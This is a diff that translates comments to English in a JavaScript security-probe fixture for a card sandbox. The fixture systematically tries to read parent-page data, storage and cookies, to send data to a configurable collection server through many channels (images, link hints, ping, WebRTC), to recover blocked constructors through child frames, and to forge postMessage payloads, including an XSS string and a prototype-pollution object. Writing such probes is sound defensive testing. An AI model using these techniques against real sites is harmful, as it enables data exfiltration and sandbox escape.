@@ -1,27 +1,45 @@
 /**
- * 越权探测卡的代码的夹具(任务书 `docs/plan/sound-online-render-task.md` 第 14 条与文末「越权探测卡」一节;契约 `docs/plan/online-card-exec-contract.md` 第 10 节)。
+ * Fixture for boundary probe card code (task brief `docs/plan/sound-online-render-task.md` Item 14 and
+ * the "Boundary probe card" section at the end; contract `docs/plan/online-card-exec-contract.md`
+ * Section 10).
  *
- * **这是防御性测试夹具,不是攻击代码**:只在测试环境里用,不进卡片库、不随发版;它在自己的代码里逐项「尝试」读取本不该读到的东西、尝试向收集站发数据,
- * 把每一项「读到了 / 被拒了 / 报了什么错」记成结果由探针取回来断言。只读、只报告:不删、不改、不占资源、不绕过浏览器或系统的安全机制;
- * 用到的口令、票据、收集站地址全是探针事先放好的**假凭证与本机地址**,不使用任何真实凭证、真实项目、真实外部地址。
+ * **This is a defensive test fixture, not exploit code**: used only in test environments, never added
+ * to the card library, never shipped with releases; it "attempts" in its own code item by item to read
+ * things it should not read, attempts to send data to the collection server, and records each item as
+ * "read / rejected / what error was thrown" for the probe to retrieve and assert. Read-only,
+ * report-only: does not delete, does not modify, does not consume resources, does not bypass browser
+ * or system security mechanisms; passphrases, tickets, and collection server addresses used are all
+ * **fake credentials and local addresses** placed in advance by the probe, with no real credentials,
+ * real projects, or real external addresses used.
  *
- * 这是**探测代码本体**,越权探测用户卡 `probe-boundary-card.tsx` 与越权探测素材效果卡 `probe-boundary-graph.tsx` 都引它。两种跑法共用这一份:
- *   - 现在(加载器还没接到舞台上):`scripts/probes/online-card-security-probe.mjs` 把本文件的 `export` 换成 CommonJS 的写法,
- *     在舞台的帧里用 `new Function("require", "module", "exports", 代码)` 执行(与加载器执行转译结果的办法相同);
- *   - 与块 T 合流之后:三份文件原样 `content.put` 进内容库,经真实的转译与加载路径执行,结果从 `globalThis.__pcBoundary` 读。
+ * This is the **probe code itself**, referenced by both boundary probe user card
+ * `probe-boundary-card.tsx` and boundary probe media effect card `probe-boundary-graph.tsx`. Both execution
+ * modes share this copy:
+ *   - Now (before loader is connected to stage): `scripts/probes/online-card-security-probe.mjs` replaces
+ *     this file's `export` with CommonJS syntax, executing in the stage frame via
+ *     `new Function("require", "module", "exports", code)` (same method used by the loader to run
+ *     transpilation output);
+ *   - After merging with Chunk T: all three files are `content.put` into the content store as-is,
+ *     executed via real transpilation and loading paths, with results read from
+ *     `globalThis.__pcBoundary`.
  *
- * 为了两种跑法都能用:只写普通的脚本(没有类型标注、不引别的模块),不出现写法预检会拦的东西 —— 动态载入那一条探测经
- * `new Function` 造出来(预检是词法层面的,拦不到它;策略会拦)。
+ * To support both execution modes: write only standard scripts (no type annotations, no external
+ * module imports), avoiding anything caught by syntax pre-checks: the dynamic loading probe is
+ * created via `new Function` (pre-checks are lexical and will not catch it; policy will block it).
  *
- * 每个函数回一个普通对象(名字 → 结果文本)。**断言不看这里的自述**,看探针那一头的事实:收集站收到没有、读出来的东西里
- * 有没有探针知道的秘密。这里的文本只用来定位是哪一条。
+ * Each function returns a plain object (name → result text). **Assertions do not look at self-reporting
+ * here**, but look at facts on the probe's end: whether the collection server received anything, and
+ * whether read data contains secrets known to the probe. The text here is only used to identify which
+ * check it is.
  */
 
 const TIMEOUT_MS = 6000;
 const text = (v) => { try { return typeof v === "string" ? v : JSON.stringify(v); } catch (e) { return String(v); } };
 /**
- * 真实时间的定时器。舞台把 `setTimeout` 换成了跟着舞台时间走的那一份(`src/render/stageClock.ts`,不播放时不走),
- * 它自己用的真定时器留在 `__pcRealSetTimeout` 上 —— 卡片代码同样拿得到。Worker 里的 `setTimeout` 本来就是真的。
+ * Real-time timer. The stage replaces `setTimeout` with one that follows stage time
+ * (`src/render/stageClock.ts`, does not advance when not playing); the real timer it uses itself is
+ * kept on `__pcRealSetTimeout`: card code can obtain it just as well. `setTimeout` inside the Worker
+ * was real to begin with.
  */
 const later = (fn, ms) => (globalThis.__pcRealSetTimeout || setTimeout)(fn, ms);
 const wait = (ms) => new Promise((r) => later(r, ms));
@@ -29,7 +47,7 @@ const wait = (ms) => new Promise((r) => later(r, ms));
 function runner(out, only) {
   return async (name, fn) => {
     if (only && only.indexOf(name) < 0) return;
-    try { globalThis.__pcBoundaryProgress = name; } catch (e) { /* 只是进度记号 */ }
+    try { globalThis.__pcBoundaryProgress = name; } catch (e) { /* Just a progress marker */ }
     try {
       out[name] = text(await Promise.race([Promise.resolve().then(fn), new Promise((r) => later(() => r("timeout"), TIMEOUT_MS))]));
     } catch (e) {
@@ -38,7 +56,7 @@ function runner(out, only) {
   };
 }
 
-/* ------------------------------------------------------------------ 读:父页对象 */
+/* ------------------------------------------------------------------ Read: parent page object */
 export async function parentReads(ctx) {
   const out = {};
   const t = runner(out, ctx.only);
@@ -55,7 +73,7 @@ export async function parentReads(ctx) {
   await t("top.document", () => String(top.document.title));
   await t("top.location.href", () => String(top.location.href));
   await t("top.localStorage", () => text(Object.keys(top.localStorage)));
-  // 兄弟框架:自己那一个读得到(回自己的地址),别的舞台源读不到
+  // Sibling frame: its own is readable (returns own URL), other stage origins are not readable
   for (let i = 0; i < 4; i++) await t("parent.frames[" + i + "]", () => (parent.frames[i] === window ? "self" : String(parent.frames[i].location.href) + " " + text(Object.keys(parent.frames[i].localStorage))));
   await t("opener", () => String(window.opener));
   await t("frameElement", () => String(window.frameElement));
@@ -68,7 +86,7 @@ export async function parentReads(ctx) {
   return out;
 }
 
-/* ------------------------------------------------------------------ 读:把舞台里读得到的一切倒出来 */
+/* ------------------------------------------------------------------ Read: dump everything readable in the stage */
 async function dumpIndexedDb(limit) {
   const parts = [];
   const dbs = await indexedDB.databases();
@@ -102,9 +120,11 @@ async function dumpOpfs(dir, depth) {
 }
 
 function dumpGlobals() {
-  // 全局对象上能走到的字符串(三层),外加每个 `__pc*` 观察口的返回值
+  // Reachable strings on global object (3 levels), plus return value of each `__pc*` observation port
   const seen = new Set(), parts = [];
-  // 有预算:最多看 20 万个值、3 秒;大数组与字节块不逐项走(里面不会有字符串形状的秘密之外的东西,另由 DOM、存储那几项覆盖)
+  // Has budget: inspect at most 200,000 values, 3 seconds; large arrays and byte chunks are not
+  // traversed item by item (they contain nothing beyond string-shaped secrets, covered separately by
+  // DOM and storage checks)
   const t0 = Date.now();
   let visited = 0;
   const walk = (v, depth, path) => {
@@ -140,13 +160,15 @@ function dumpDom() {
   for (const el of Array.from(document.querySelectorAll("*")).slice(0, 5000)) {
     for (const a of Array.from(el.attributes)) if (a.value && a.value.length >= 6) parts.push(el.localName + "@" + a.name + "=" + a.value.slice(0, 2000));
   }
-  for (const s of Array.from(document.styleSheets)) { try { for (const r of Array.from(s.cssRules).slice(0, 2000)) if (/url\(/.test(r.cssText)) parts.push("css:" + r.cssText.slice(0, 500)); } catch (e) { /* 读不了的样式表 */ } }
+  for (const s of Array.from(document.styleSheets)) { try { for (const r of Array.from(s.cssRules).slice(0, 2000)) if (/url\(/.test(r.cssText)) parts.push("css:" + r.cssText.slice(0, 500)); } catch (e) { /* Unreadable stylesheet */ } }
   return parts.join("\n");
 }
 
 /**
- * 把舞台的脚本环境里读得到的东西全倒成文本:本机存储、cookie、性能条目、DOM 属性、全局变量与观察口、地址与来源、
- * 以及接下来 `ctx.listenMs` 毫秒里父页发来的每一条消息(`setMediaPolicy` 等 RPC)。探针拿它逐个比对自己知道的秘密。
+ * Dumps everything readable in stage script environment to text: local storage, cookies, performance
+ * entries, DOM properties, global variables and observation ports, URLs and origins, and every
+ * message sent by the parent page over the next `ctx.listenMs` ms (RPCs like `setMediaPolicy`).
+ * The probe compares each against the secrets it knows.
  */
 export async function dumpEverything(ctx) {
   const out = {};
@@ -167,7 +189,8 @@ export async function dumpEverything(ctx) {
   await t("performance", () => text(performance.getEntries().map((e) => e.name)));
   await t("dom", () => dumpDom());
   await t("globals", () => dumpGlobals());
-  // 凭 cookie 读素材:读得到字节(素材效果卡本来就要),但应答头里不该有票据
+  // Read asset with cookie: bytes are readable (media effect card needs this anyway), but response
+  // headers must not contain tickets
   if (ctx.sid && ctx.mediaHash) {
     await t("media-headers", () => fetch("/media-s/" + ctx.sid + "/media/" + ctx.mediaHash).then((r) => r.status + " " + text(Array.from(r.headers.entries()))));
     await t("grant-from-stage", () => fetch("/media-s/" + ctx.sid + "/_grant", { method: "POST", credentials: "include" }).then((r) => r.status + " " + text(Array.from(r.headers.entries()))));
@@ -180,7 +203,7 @@ export async function dumpEverything(ctx) {
   return out;
 }
 
-/** 只听父页发来的消息 `ctx.listenMs` 毫秒(取档策略等 RPC 都经这里):里面不该有票据 */
+/** Only listens to parent page messages for `ctx.listenMs` ms (RPCs like tier selection policy go through here): must not contain tickets */
 export async function listenParent(ctx) {
   const heard = [];
   const onMessage = (e) => { try { heard.push(text(e.data).slice(0, 200000)); } catch (err) { heard.push("message unreadable"); } };
@@ -190,7 +213,7 @@ export async function listenParent(ctx) {
   return { "parent-messages": heard.join("\n") };
 }
 
-/* ------------------------------------------------------------------ 带走:向收集站发请求的每一种办法 */
+/* ------------------------------------------------------------------ Exfiltration: every way to send requests to collection server */
 export async function exfilAttacks(ctx) {
   const out = {};
   const t = runner(out, ctx.only);
@@ -226,7 +249,9 @@ export async function exfilAttacks(ctx) {
   await t("embed", async () => { const o = document.createElement("embed"); o.src = q("embed"); mount(o); await wait(300); return "inserted"; });
   await t("video", () => new Promise((res) => { const v = document.createElement("video"); v.onerror = () => res("blocked"); v.onloadeddata = () => res("reached"); v.src = E + "/x.webm?video=" + tag; later(() => res("no result"), 1200); }));
   await t("audio-track", async () => { const a = document.createElement("audio"); a.src = E + "/x.mp3?audio=" + tag; const v = document.createElement("video"); const tr = document.createElement("track"); tr.src = E + "/x.vtt?track=" + tag; tr.default = true; v.appendChild(tr); v.poster = E + "/x.png?poster=" + tag; mount(a); mount(v); await wait(500); return "inserted"; });
-  // 表单提交(本框架、新窗口)与带 download 的链接会把舞台自己带走(被拦下后框架落到错误页),归到导航类里单独跑(navAttack 的 form-self、form-blank、a-download)
+  // Form submission (current frame, new window) and links with download navigate the stage itself away
+  // (frame lands on error page after interception); categorized under navigation to run separately
+  // (form-self, form-blank, a-download of navAttack)
   await t("a-ping", async () => { const a = document.createElement("a"); a.href = "#"; a.ping = q("ping"); mount(a); a.click(); await wait(300); return "clicked"; });
   for (const rel of ["prefetch", "preload", "preconnect", "dns-prefetch", "modulepreload", "prerender"]) {
     await t("hint-" + rel, async () => { const l = document.createElement("link"); l.rel = rel; l.href = E + "/x.js?" + rel + "=" + tag; if (rel === "preload") l.as = "script"; document.head.appendChild(l); await wait(500); return "inserted"; });
@@ -245,7 +270,7 @@ export async function exfilAttacks(ctx) {
   return out;
 }
 
-/** WebRTC:向收集站发 STUN(UDP)与 TURN(TCP)。`Ctor` 是拿得到的构造器(加固之后本文档里是 undefined) */
+/** WebRTC: sends STUN (UDP) and TURN (TCP) to collection server. `Ctor` is obtainable constructor (undefined in this document after hardening) */
 export function webrtcAttack(ctx, Ctor) {
   return new Promise((res) => {
     if (typeof Ctor !== "function") return res("no constructor");
@@ -261,15 +286,15 @@ export function webrtcAttack(ctx, Ctor) {
   });
 }
 
-/* ------------------------------------------------------------------ 加固:从子框架拿回 RTCPeerConnection 的每一条路 */
+/* ------------------------------------------------------------------ Hardening: every path to retrieve RTCPeerConnection from child frames */
 export async function hardenAttacks(ctx) {
   const out = {};
   const host = document.createElement("div");
   (document.body || document.documentElement).appendChild(host);
   const XHTML = "http://www.w3.org/1999/xhtml";
-  /** 此刻舞台里有没有子框架、里面拿不拿得到构造器(只看拿不拿得到,不用它) */
+  /** Whether child frames exist in stage right now and whether constructor is obtainable inside (only checks if obtainable, does not use it) */
   const grab = () => {
-    for (let i = 0; i < window.length; i++) { try { if (typeof window[i].RTCPeerConnection === "function") return "obtained"; } catch (e) { /* 读不了 */ } }
+    for (let i = 0; i < window.length; i++) { try { if (typeof window[i].RTCPeerConnection === "function") return "obtained"; } catch (e) { /* Cannot read */ } }
     return "not obtained (" + window.length + " child frames)";
   };
   const clean = () => { for (const f of Array.from(document.querySelectorAll("iframe,object,embed,frame,frameset,portal,fencedframe"))) f.remove(); host.textContent = ""; };
@@ -284,7 +309,7 @@ export async function hardenAttacks(ctx) {
     clean();
   };
   out["own"] = typeof window.RTCPeerConnection + "/" + typeof window.webkitRTCPeerConnection;
-  // —— 可行性探针试过的 21 条(留作回归)
+  // 21 items tested by feasibility probe (kept for regression)
   t("createElement", () => host.appendChild(document.createElement("iframe")));
   t("createElement-uppercase", () => host.appendChild(document.createElement("IFRAME")));
   t("createElementNS", () => host.appendChild(document.createElementNS(XHTML, "iframe")));
@@ -306,15 +331,15 @@ export async function hardenAttacks(ctx) {
   await asyncT("XHR responseType=document", () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", ctx.frameDocUrl); try { x.responseType = "document"; } catch (e) { return rej(e); } x.onload = () => { try { const d = x.response || x.responseXML; const el = d.querySelector("iframe") || d.createElement("iframe"); host.appendChild(document.importNode(el, true)); res(); } catch (e) { rej(e); } }; x.onerror = () => rej(new Error("unavailable")); x.send(); }));
   t("execCommand", () => { host.contentEditable = "true"; host.focus(); document.execCommand("insertHTML", false, "<iframe></iframe>"); });
   t("window.open", () => { const w = window.open("about:blank"); if (w && typeof w.RTCPeerConnection === "function") throw new Error("OPENED"); });
-  // —— 实现时补的
+  // Added during implementation
   t("XHR responseXML (synchronous)", () => { const x = new XMLHttpRequest(); x.open("GET", ctx.frameDocUrl, false); x.overrideMimeType("application/xhtml+xml"); x.send(); const d = x.responseXML; host.appendChild(document.importNode(d.querySelector("iframe"), true)); });
   t("XML entity expansion", () => { const d = new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY f "&#60;iframe xmlns=\'' + XHTML + '\'/&#62;">]><r xmlns="' + XHTML + '">&f;</r>', "application/xhtml+xml"); host.appendChild(document.importNode(d.documentElement, true)); });
   t("DOMParser XML + importNode", () => { const d = new DOMParser().parseFromString("<if" + "rame xmlns='" + XHTML + "'/>", "application/xhtml+xml"); host.appendChild(document.importNode(d.documentElement, true)); });
   t("cloneNode (another document)", () => { const d = document.implementation.createHTMLDocument(""); const f = d.createElement("iframe"); host.appendChild(f.cloneNode(true)); });
   t("Range.insertNode", () => { const d = document.implementation.createHTMLDocument(""); const r = document.createRange(); r.selectNodeContents(host); r.insertNode(document.adoptNode(d.createElement("iframe"))); });
   t("insertAdjacentElement", () => { const d = document.implementation.createHTMLDocument(""); host.insertAdjacentElement("beforeend", document.adoptNode(d.createElement("iframe"))); });
-  t("append / prepend / replaceChildren", () => { const d = document.implementation.createHTMLDocument(""); const mk = () => document.adoptNode(d.createElement("iframe")); try { host.append(mk()); } catch (e) { /* 下一个 */ } try { host.prepend(mk()); } catch (e) { /* 下一个 */ } host.replaceChildren(mk()); });
-  t("before / after / replaceWith", () => { const d = document.implementation.createHTMLDocument(""); const mk = () => document.adoptNode(d.createElement("iframe")); const a = document.createElement("span"); host.appendChild(a); try { a.before(mk()); } catch (e) { /* 下一个 */ } try { a.after(mk()); } catch (e) { /* 下一个 */ } a.replaceWith(mk()); });
+  t("append / prepend / replaceChildren", () => { const d = document.implementation.createHTMLDocument(""); const mk = () => document.adoptNode(d.createElement("iframe")); try { host.append(mk()); } catch (e) { /* Next */ } try { host.prepend(mk()); } catch (e) { /* Next */ } host.replaceChildren(mk()); });
+  t("before / after / replaceWith", () => { const d = document.implementation.createHTMLDocument(""); const mk = () => document.adoptNode(d.createElement("iframe")); const a = document.createElement("span"); host.appendChild(a); try { a.before(mk()); } catch (e) { /* Next */ } try { a.after(mk()); } catch (e) { /* Next */ } a.replaceWith(mk()); });
   t("after on a text node", () => { const d = document.implementation.createHTMLDocument(""); const tx = document.createTextNode("x"); host.appendChild(tx); tx.after(document.adoptNode(d.createElement("iframe"))); });
   t("replaceChild", () => { const d = document.implementation.createHTMLDocument(""); const a = document.createElement("span"); host.appendChild(a); host.replaceChild(document.adoptNode(d.createElement("iframe")), a); });
   t("carried inside a fragment (appendChild of a fragment)", () => { const d = document.implementation.createHTMLDocument(""); const fr = document.createDocumentFragment(); const wrap = document.createElement("div"); fr.appendChild(wrap); Node.prototype.appendChild.call(wrap, document.adoptNode(d.createElement("iframe"))); host.appendChild(fr); });
@@ -330,8 +355,9 @@ export async function hardenAttacks(ctx) {
   t("createElement after the prototype is overwritten", () => { const keep = String.prototype.toLowerCase; String.prototype.toLowerCase = function () { return "div"; }; try { host.appendChild(document.createElement("iframe")); } finally { String.prototype.toLowerCase = keep; } });
   t("Reflect.apply overwritten", () => { const keep = Reflect.apply; Reflect.apply = function (f, th, args) { return keep(f, th, args); }; try { host.appendChild(document.createElement("iframe")); } finally { Reflect.apply = keep; } });
   t("iframe in the MathML / SVG namespace", () => { host.appendChild(document.createElementNS("http://www.w3.org/2000/svg", "iframe")); });
-  t("Constructor inside a Worker", () => { /* Worker 里本来就没有 RTCPeerConnection:由 workerAttempts 断言 */ });
-  // 兜底的时机:同一拍里插入后马上取(上面每条的 grab 就是同一拍);再等一拍看还剩不剩
+  t("Constructor inside a Worker", () => { /* Worker does not have RTCPeerConnection to begin with: asserted by workerAttempts */ });
+  // Fallback timing: retrieve immediately after insertion in same tick (grab in each item above is in
+  // the same tick); wait another tick to see if any remain
   await wait(300);
   out["Child frame count at the end"] = String(window.length);
   host.remove();
@@ -339,8 +365,10 @@ export async function hardenAttacks(ctx) {
 }
 
 /**
- * 加固的第二层(插入入口)与兜底:假设「不给造子框架元素」那一层被绕过了 —— `make` 是探针在页面脚本之前留的一个
- * 「原装 createElement 造 iframe」的函数(`globalThis.__pcMakeFrame`)。手里有了元素,逐个插入入口试,看舞台里会不会真的出现子框架。
+ * Second layer of hardening (insertion entry points) and fallback: assuming the "disallow creating
+ * child frame elements" layer is bypassed: `make` is a function left by the probe before page scripts
+ * that "creates iframe with genuine createElement" (`globalThis.__pcMakeFrame`). With element in hand,
+ * try each insertion entry point one by one to see whether a child frame actually appears in stage.
  */
 export async function insertAttacks(ctx) {
   const out = {};
@@ -351,7 +379,8 @@ export async function insertAttacks(ctx) {
   const t = (name, fn) => {
     let said = "";
     try { fn(); said = "inserted"; } catch (e) { said = "threw:" + (e && e.name); }
-    // 同一拍里看:插入入口没拦住的话这里就有子框架了(兜底的观察器要到下一拍才摘)
+    // Checked in the same tick: if insertion points did not block it, a child frame exists here
+    // (the fallback observer does not remove it until the next tick)
     out[name] = said + "; in the same tick, " + window.length + " child frames";
     for (const f of Array.from(document.querySelectorAll("iframe"))) f.remove();
     host.textContent = "";
@@ -386,9 +415,11 @@ export async function insertAttacks(ctx) {
   return out;
 }
 
-/* ------------------------------------------------------------------ 伪造:向父页发各种消息 */
+/* ------------------------------------------------------------------ Forgery: send various messages to parent page */
 export function forgedMessages(ctx) {
-  // 超范围的数现拼出来:这份源码(连同转译结果)会进编辑页面的转译缓存,字面量写在这里的话探针在父页存储里找这个数时会找到源码本身
+  // Construct out-of-range number dynamically: this source code (along with transpilation output)
+  // enters the editor page transpilation cache; if the literal were written here, the probe would
+  // find the source code itself when searching for this number in parent page storage
   const HUGE = Number("7.77e" + "98");
   const M = ctx.magic, big = "x".repeat(1024 * 1024);
   const xss = "<img src=x onerror=\"parent.__pcXss=1;window.__pcXss=1\"><script>window.__pcXss=1</" + "script><div data-pcboundary-html=\"" + ctx.tag + "\">" + M + "</div>";
@@ -417,12 +448,12 @@ export function forgedMessages(ctx) {
     null, 42, big, [], { type: 7 },
   ];
   let sent = 0;
-  for (const m of list) { try { parent.postMessage(m, "*"); sent++; } catch (e) { /* 克隆不了的不算 */ } }
-  try { parent.postMessage(JSON.parse('{"type":"frame","sec":1,"__proto__":{"polluted":"' + M + '"}}'), "*"); sent++; } catch (e) { /* 忽略 */ }
+  for (const m of list) { try { parent.postMessage(m, "*"); sent++; } catch (e) { /* What cannot be cloned does not count */ } }
+  try { parent.postMessage(JSON.parse('{"type":"frame","sec":1,"__proto__":{"polluted":"' + M + '"}}'), "*"); sent++; } catch (e) { /* Ignore */ }
   return { sent: String(sent) };
 }
 
-/* ------------------------------------------------------------------ 素材效果卡那一半:凭 cookie 读素材、进 GPU */
+/* ------------------------------------------------------------------ Media effect card half: read assets via cookie, enter GPU */
 export async function mediaWork(ctx) {
   const out = {};
   const t = runner(out, ctx.only);
@@ -439,7 +470,7 @@ export async function mediaWork(ctx) {
   return out;
 }
 
-/* ------------------------------------------------------------------ 声音那一半:在 Worker 里跑 */
+/* ------------------------------------------------------------------ Sound half: run in Worker */
 export async function workerAttempts(ctx) {
   const out = {};
   const t = runner(out, ctx.only);
@@ -466,7 +497,7 @@ export async function workerAttempts(ctx) {
   return out;
 }
 
-/* ------------------------------------------------------------------ 导航:把舞台自己或顶层带走(会带死舞台,探针每种单开一页) */
+/* ------------------------------------------------------------------ Navigation: navigate the stage itself or top level away (will kill stage; probe opens a separate page for each) */
 export function navAttack(ctx) {
   const E = ctx.collector, tag = ctx.tag, nav = ctx.nav;
   try {
@@ -489,12 +520,14 @@ export function navAttack(ctx) {
   }
 }
 
-/** 一张卡把上面几组连着跑一遍(用户卡与素材效果卡的入口都调它;素材效果卡多一组读素材进 GPU) */
+/** A single card runs the above groups in sequence (both user card and media effect card entry points call it; media effect card has an extra group reading assets into the GPU) */
 export async function runAll(ctx) {
   const result = { tag: ctx.tag, at: Date.now() };
   result.parent = await parentReads(ctx);
-  // 一边听父页的消息,一边:把读得到的一切倒出来、(素材效果卡)凭 cookie 读素材进 GPU、试着造一个子框架(加固拦下并上报,
-  // 父页改判、把取档策略重发给两台 —— 听到的消息里不该有票据)
+  // While listening for messages from the parent page: dump everything readable, (media effect
+  // cards) read assets into GPU via cookies, try creating a subframe (hardening intercepts and reports
+  // it, parent page re-evaluates and resends tier selection policy to both instances: heard messages
+  // should not contain tickets)
   const heard = [];
   const onMessage = (e) => { try { heard.push(text(e.data).slice(0, 200000)); } catch (err) { heard.push("message unreadable"); } };
   addEventListener("message", onMessage);
@@ -504,7 +537,8 @@ export async function runAll(ctx) {
   await wait(ctx.listenAfterMs || 4000);
   removeEventListener("message", onMessage);
   result.heard = { "parent-messages": heard.join("\n") };
-  // 这时闸门已经因为上面那一下关上了;照样硬跑,看的是浏览器与加固拦不拦得住
+  // By this point the gate has already closed due to the attempt above; run anyway to see whether
+  // the browser and hardening can block it
   result.forged = forgedMessages(ctx);
   result.exfil = await exfilAttacks({ ...ctx, only: ["fetch", "img", "css-bg", "script"] });
   result.harden = await hardenAttacks(ctx);
